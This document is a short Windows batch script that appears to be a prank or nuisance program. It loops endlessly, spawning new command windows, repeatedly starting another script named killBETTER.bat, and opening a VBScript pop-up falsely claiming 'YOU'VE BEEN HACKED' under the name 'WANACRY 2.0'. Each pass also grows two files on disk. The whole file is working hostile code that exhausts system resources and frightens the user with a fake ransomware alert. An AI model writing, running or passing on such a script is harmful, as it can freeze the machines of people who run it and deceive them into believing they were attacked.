@echo off
SET /a INT1 = 1
:yeet

echo x=msgbox("YOU'VE BEEN HACKED" ,1, "WANACRY 2.0") >> msgbox.vbs
echo %INT1% >> HA.txt
Set /a INT1 = %INT1% * 9
start killBETTER.bat
start msgbox.vbs
start
goto yeet